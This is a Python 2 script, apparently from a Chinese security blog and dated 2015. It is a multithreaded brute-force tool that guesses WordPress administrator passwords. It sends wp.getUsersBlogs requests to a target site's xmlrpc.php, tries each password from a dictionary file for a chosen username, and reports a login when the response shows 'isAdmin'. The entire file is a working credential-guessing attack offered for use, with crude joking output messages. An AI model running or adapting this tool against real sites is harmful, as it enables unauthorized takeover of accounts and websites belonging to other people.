#!/usr/bin/env python
# -*- coding: gbk -*-
# -*- coding: utf_8 -*-
# Date: 2015/4/29
# Created by 独自等待
# 博客 http://www.waitalone.cn/
import os, sys, time, urllib2
import threading, Queue


def usage():
    os.system(['clear', 'cls'][os.name == 'nt'])
    print '+' + '-' * 50 + '+'
    print '\t Python WordPress暴力破解工具多线程版'
    print '\t   Blog：http://www.waitalone.cn/'
    print '\t       Code BY： 独自等待'
    print '\t       Time：2015-04-29'
    print '+' + '-' * 50 + '+'
    if len(sys.argv) != 4:
        print '用法: ' + os.path.basename(sys.argv[0]) + '  用户名  密码字典  待破解的网站URL地址  '
        print '实例: ' + os.path.basename(sys.argv[0]) + '  admin  pass.txt http://www.waitalone.cn/ '
        sys.exit()


queue = Queue.Queue()
lock = threading.RLock()
success = []


class Crack(threading.Thread):
    '''
    WordPress xmlrpc多线程暴力破解类
    '''

    def __init__(self, queue):
        super(Crack, self).__init__()
        self.queue = queue
        self.crack_url = url + 'xmlrpc.php'

    def run(self):
        while True:
            try:
                password = self.queue.get()
                if password == None: break
                self.post = '''
                    <?xml version="1.0" encoding="iso-8859-1"?>
                    <methodCall>
                      <methodName>wp.getUsersBlogs</methodName>
                      <params>
                       <param><value>''' + username + '''</value></param>
                       <param><value>''' + password + '''</value></param>
                      </params>
                    </methodCall>
                '''
                self.header = {
                    'UserAgent': 'Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.1; Win64; x64; Trident/5.0)',
                    'Referer': self.crack_url
                }
                self.req = urllib2.Request(self.crack_url, data=self.post, headers=self.header)
                self.res = urllib2.urlopen(self.req, timeout=10).read().decode('utf-8').encode('GBK')
            except Exception, msg:
                lock.acquire()
                print '发生了异常情况,卧槽!!!!!!!', msg
                lock.release()
            else:
                lock.acquire()
                if 'faultCode' in self.res:
                    print '[×] 报告爷,正在尝试密码: %s' % password
                elif 'isAdmin' in self.res:
                    print '\n[√] 报告爷,密码破解成功: %s\n' % password
                    success.append(password)
                lock.release()
            finally:
                self.queue.task_done()


if __name__ == '__main__':
    usage()
    username = sys.argv[1]
    url = sys.argv[3]
    if url[-1] != '/': url += '/'
    print '[√] 目标：', url + '\n'
    start = time.time()
    if os.path.isfile(sys.argv[2]):
        passlist = [x.strip() for x in open(sys.argv[2])]
        print '[√] 报告爷,共有密码[ %d ]行!\n' % len(passlist)
        for i in range(10):
            t = Crack(queue)
            t.setDaemon(True)
            t.start()
        for password in passlist:
            queue.put(password)
        queue.join()
        if success:
            print '\n[√] 大爷,您人品太好了,密码破解成功!'
            print '\n[√] 用户名: %s,密码：%s' % (username, success[0])
        else:
            print '\n[!] 卧槽,居然没有找到密码,他爷爷的,字典不行呀!'
        print '\n[!] 卧槽,这么快就执行完了?用时：%s 秒' % (time.time() - start)
    else:
        print '爷,没有密码字典,破解个毛呀?'